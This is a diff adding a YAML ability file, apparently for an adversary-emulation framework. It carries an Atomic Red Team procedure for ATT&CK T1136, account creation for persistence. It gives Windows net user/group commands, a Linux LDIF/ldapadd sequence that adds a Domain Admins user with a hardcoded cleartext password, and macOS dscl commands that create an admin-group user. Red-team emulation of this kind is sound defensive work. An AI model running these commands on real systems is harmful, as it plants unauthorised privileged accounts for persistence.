@@ -1,0 +1,29 @@
+- id: a9c9ba42-0627-40dc-a549-ca0a4e2ad004
+  name: Create Account
+  description: Ability for Create Account (ATT&CK T1136). Generated from Atomic Red
+    Team procedures; review and test safely before use.
+  tactic: persistence
+  technique:
+    attack_id: T1136
+    name: Create Account
+  platforms:
+    windows:
+      psh:
+        command: net user "#{username}" "#{password}" /add /domain net group "#{group}"
+          "#{username}" /add /domain
+    linux:
+      sh:
+        command: 'echo "dn: CN=Admin User,CN=Users,DC=#{domain},DC=#{top_level_domain}\nchangetype:
+          add\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass:
+          user\ncn: Admin User\nsn: User\ngivenName: Atomic User\nuserPrincipalName:
+          adminuser@#{domain}.#{top_level_domain}\nsAMAccountName: adminuser\nuserAccountControl:
+          512\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\nmemberOf: CN=Domain Admins,CN=Users,DC=#{domain},DC=#{top_level_domain}"
+          > tempadmin.ldif echo ldapadd -H ldap://#{domain}.#{top_level_domain}:389
+          -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif ldapadd -H ldap://#{domain}.#{top_level_domain}:389
+          -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif'
+    darwin:
+      sh:
+        command: dscl . -create /Users/#{username} dscl . -create /Users/#{username}
+          UserShell /bin/zsh dscl . -create /Users/#{username} RealName "#{realname}"
+          dscl . -create /Users/#{username} UniqueID "1010" dscl . -create /Users/#{username}
+          PrimaryGroupID 80 dscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}
